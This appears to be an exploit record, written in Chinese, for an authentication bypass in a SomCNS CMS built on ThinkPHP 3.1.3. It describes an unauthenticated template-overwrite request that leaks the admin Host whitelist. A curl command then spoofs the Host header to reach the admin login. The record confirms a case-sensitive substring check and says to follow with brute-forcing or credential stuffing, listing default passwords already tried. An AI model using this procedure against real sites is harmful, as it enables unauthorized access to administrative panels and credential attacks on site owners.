# SomCNS/ThinkPHP3.1.3 站群：从被 get_html1 覆盖的模板渲染里抠出后台 Host 白名单，闸门是大小写敏感子串匹配（可被任意域后缀承载绕过）

- **code**: somcns-thinkphp3.1.3-站群-从被-get_html1-覆盖的模板渲染里抠出后台-host-白名单-闸
- **kind**: exp
- **category**: auth-bypass
- **component**: SomCNS 站群 CMS（ThinkPHP 3.1.3）CommonAction 后台 Host 闸门
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-29 在 192.0.2.1（SNI target479.example.com，docroot /www/wwwroot/thisthbweb_com）实测：基线 Host=真实域名 → 302/0B；Host=target481.example.com → 200/919B 后台登录页（含 name="username"/name="password"，页脚 SomCNS）；Host=evil- 前缀同域 → 200/919B；Host=<白名单域>.attacker604.tld → 200/919B；Host 大小写变体 → 302/0B。白名单字符串来自 get_html1 覆盖后的 App/Tpl/Home/Index_index.html 与 /Upload/atop/jquery3_5.txt 渲染内容。同 Host 下 admin/admin888、admin/123456、admin/thisthbweb 登录仍 302（凭据未取得）。
- **tags**: thinkphp3.1.3,somcns,host白名单,认证绕过,子串匹配,get_html1
- **created_at**: 2026-10-28T19:00:37.910Z
- **engine**: https://target479.example.com (192.0.2.1)
- **found_by**: work

## 描述

SomCNS/ThinkPHP 3.1.3 站群的后台闸门（CommonAction::_initialize）对 HTTP_HOST 做大小写敏感的子串包含判断，只要请求 Host 里出现白名单域名即放行。白名单域名不必去猜：零凭证的 Home/Order::get_html1 会把站点自身的 /List/index 渲染结果覆盖进 App/Tpl/Home/Index_index*.html（nginx 静态直出），渲染内容里就带出配置域名（如 usertobbs.<品牌>.<随机>.top）。因此可以「写模板 → 读回渲染 → 抠白名单 Host → 过闸拿到真实后台登录页」，把原本一律 302 的后台入口变成可爆破的活页面。

## 用法

```
1) 先拿白名单字符串：跑一遍零凭证 GET /index.php?g=Home&m=Order&a=get_html1（会把本站 /List/index 渲染结果覆盖进 App/Tpl/Home/Index_index.html、Index_indexapp.html），再 GET /App/Tpl/Home/Index_index.html 与 /Upload/atop/jquery3_5.txt，从中 grep 'https?://([A-Za-z0-9.-]+)' 取重复出现、与站点品牌同名的域（形如 usertobbs.<品牌>.<随机>.top）= 配置域名/白名单 Host。
2) 用该域作 Host 头（SNI 仍固定真实站点域名，或 --resolve 直连源站 IP）打 GET /Admin/Index/login：302/0B=未命中，200 且含 name="username"=闸门放行。
3) 子串验证：Host="evil-<白名单域>" → 200；Host="<白名单域>.attacker.tld" → 200；Host 改成大写 → 302 ⇒ case-sensitive strpos。
4) 放行后未登录业务页仍 302→/Admin/Index/login（第二级登录态），接下来把 Host 固定成该值走真实登录页做爆破/撞库，不要再走 cookie 预言机。
命令：curl -k -s --noproxy "*" --resolve <TARGET_HOST>:443:<IP> -H "Host: <白名单域>" -o /dev/null -w '%{http_code} %{size_download}\n' "https://<TARGET_HOST>/Admin/Index/login"
```
